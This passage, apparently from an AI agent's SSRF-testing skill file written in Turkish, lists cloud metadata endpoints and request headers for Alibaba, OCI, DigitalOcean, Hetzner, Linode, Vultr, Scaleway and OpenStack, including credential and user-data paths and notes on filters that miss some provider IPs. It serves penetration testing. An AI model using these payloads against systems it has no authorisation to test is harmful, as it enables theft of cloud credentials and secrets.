### 12.10 Alibaba Cloud — Metadata Server

- **Endpoint:** `http://100.100.100.200/latest/meta-data/`
  (Alibaba Cloud, AWS'nin `169.254.169.254`'ünden **farklı** bir IP
  kullanır — bu, §7'deki "cevap yok" durumunda denenmesi gereken
  alternatif provider IP'lerinden biridir).
  ```
  http://100.100.100.200/latest/meta-data/ram/security-credentials/
  ```

### 12.11 Oracle Cloud Infrastructure (OCI) — Metadata Server

- **Endpoint:** `http://169.254.169.254/opc/v2/instance/` (v2, header
  zorunlu) veya `http://169.254.169.254/opc/v1/instance/` (v1, eski/
  header'sız).
  ```
  http://169.254.169.254/opc/v2/instance/
  Header: Authorization: Bearer Oracle
  ```

### 12.12 DigitalOcean — Metadata Server

- **Endpoint:** `http://169.254.169.254/metadata/v1/`
  ```
  http://169.254.169.254/metadata/v1/user-data
  http://169.254.169.254/metadata/v1/id
  ```
  (DigitalOcean'ın metadata servisi genelde ek bir header
  gerektirmez — bu, AWS IMDSv2/GCP/Azure'a göre daha "SSRF-friendly"
  bir tasarımdır, tespit edilirse impact assessment'ta bu kolaylık
  not edilmeli.)


### 12.15 Diğer Cloud/VPS Sağlayıcıları — AWS Dışındaki Yaygın Metadata Servisleri

AWS/GCP/Azure dışında, özellikle Avrupa merkezli VPS sağlayıcılarında
ve OpenStack tabanlı private/enterprise cloud'larda sıkça karşılaşılan,
aynı `169.254.x.x` link-local deseniyle çalışan metadata servisleri:

- **Hetzner Cloud** — aynı IP'yi (`169.254.169.254`) AWS ile paylaşır,
  ama farklı bir path prefix'i kullanır, header gerektirmez:
  ```
  http://169.254.169.254/hetzner/v1/metadata
  http://169.254.169.254/hetzner/v1/metadata/hostname
  http://169.254.169.254/hetzner/v1/metadata/instance-id
  http://169.254.169.254/hetzner/v1/metadata/private-networks
  ```
- **Linode / Akamai Connected Cloud** — kendi IP'sinde (`169.254.169.254`)
  ama AWS IMDSv2'ye benzer bir token akışı gerektirir:
  ```
  PUT http://169.254.169.254/v1/token
  Header: Metadata-Token-Expiry-Seconds: 3600

  → dönen token ile:
  GET http://169.254.169.254/v1/instance
  Header: Metadata-Token: <token>
  GET http://169.254.169.254/v1/network
  Header: Metadata-Token: <token>
  ```
- **Vultr** — aynı IP (`169.254.169.254`), IMDSv1'e benzer şekilde
  token'sız erişilebilir:
  ```
  http://169.254.169.254/v1.json
  ```
- **Scaleway — KRİTİK FARK: tamamen farklı bir IP kullanır** (AWS/GCP/
  Azure/Hetzner/Linode/Vultr'un hepsinin paylaştığı `169.254.169.254`
  **değil**, kendine özgü `169.254.42.42`) — bu nedenle yalnızca
  `169.254.169.254`'ü hedefleyen bir test/blacklist bu provider'ı
  tamamen kaçırır:
  ```
  http://169.254.42.42/conf
  http://169.254.42.42/conf?format=json
  http://169.254.42.42/user_data
  http://[fd00:42::42]/conf                 (IPv6 varyantı)
  ```
  **Not:** Scaleway'in `user_data` endpoint'i, isteğin 1024 altı bir
  kaynak porttan gelmesini zorunlu kılar (`CAP_NET_BIND_SERVICE`/
  root gerektirir) — bir web uygulaması sürecinden tetiklenen tipik
  bir SSRF'nin varsayılan olarak yüksek/rastgele bir kaynak port
  kullanması nedeniyle bu spesifik endpoint pratikte erişilemez
  olabilir; `/conf` endpoint'i bu kısıtlamaya tabi değildir.
- **OpenStack tabanlı private/enterprise cloud'lar (birçok kurumsal
  iç bulut ve bazı bölgesel public cloud sağlayıcısı OpenStack Nova
  üzerine kuruludur) — hem EC2-uyumlu hem native format sunar:**
  ```
  http://169.254.169.254/latest/meta-data/          (EC2-uyumlu format)
  http://169.254.169.254/openstack/latest/meta_data.json   (native format)
  http://169.254.169.254/openstack/latest/user_data
  http://[fe80::a9fe:a9fe%<interface>]/openstack/latest/meta_data.json   (IPv6 link-local, arayüz zone-id gerektirir)
  ```
  OpenStack fingerprint'i tespit edildiğinde (§7), EC2-uyumlu path'in
  çalışması hedefin **hangi bulutta olduğunu yanlış işaret
  edebileceğini** unutma — `latest/meta-data/` başarılı dönse bile
  hedefin gerçek AWS olduğunu varsaymadan önce `openstack/latest/
  meta_data.json`'ı da dene, ikisi de dönerse OpenStack'tir.
- **Diğer bölgesel sağlayıcılar (Tencent Cloud, Huawei Cloud, IBM
  Cloud gibi) da benzer bir link-local metadata deseni sunar** — bu
  skill bunların tam endpoint/path detaylarını (doğrulanmamış
  bilgiyi hard-code etmeme prensibi gereği, bkz. §15) burada
  listelemez; hedefte bu sağlayıcılardan biri tespit edilirse (§7),
  o providerın güncel resmi metadata servisi dokümantasyonundan
  ampirik olarak doğrulanması önerilir — genel arama deseni her
  zaman aynıdır: `169.254.169.254` (veya sağlayıcıya özgü bir
  link-local IP) + `/latest/meta-data/`, `/metadata/`, `/v1/`,
  `/openstack/` gibi yaygın path önekleri.

